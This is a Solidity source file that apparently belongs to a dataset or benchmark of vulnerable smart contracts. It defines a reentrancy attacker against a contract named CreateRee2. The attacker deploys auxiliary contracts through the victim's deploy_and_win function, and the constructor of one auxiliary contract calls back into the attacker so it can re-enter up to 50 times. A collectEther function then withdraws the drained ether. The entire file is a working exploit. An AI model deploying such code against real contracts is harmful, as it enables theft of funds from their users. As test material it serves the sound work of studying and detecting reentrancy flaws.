// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../dataset/cross-contract/create/Create_ree2.sol";

contract CreateRee2Attacker {
    bytes private create_auxharmless_initcode;
    bytes private create_auxharmful_initcode;
    CreateRee2 private victim;
    uint public stackCount;
    bool public flag;

    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
    constructor(address payable _victim) {
        victim = CreateRee2(_victim);
    }

    function attack() public payable {
        flag = true;
        while (flag) {
            // attack only every 10 instances, i.e. when some money is transfered
            if ((victim.getCounter(address(this)) + 1) % 10 == 0) {
                stackCount++;
                flag = false;
                bytes memory contractCode = abi.encodePacked(
                    type(CreateRee2AttackerAux2).creationCode,
                    abi.encode(address(this))
                );
                victim.deploy_and_win{value: 1 ether}(
                    contractCode,
                    payable(address(this))
                );
            } else {
                victim.deploy_and_win{value: 1 ether}(
                    type(CreateRee2AttackerAux1).creationCode,
                    payable(address(this))
                );
            }
        }
    }

    function attackStep2() public {
        if (address(victim).balance >= 1 ether && stackCount < 50) {
            stackCount++;
            bytes memory contractCode = abi.encodePacked(
                type(CreateRee2AttackerAux2).creationCode,
                abi.encode(address(this))
            );
            victim.deploy_and_win{value: 1 ether}(
                contractCode,
                payable(address(this))
            );
        }
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract CreateRee2AttackerAux1 {
    constructor() {}
}

contract CreateRee2AttackerAux2 {
    constructor(address payable attacker) {
        CreateRee2Attacker(attacker).attackStep2();
    }
}
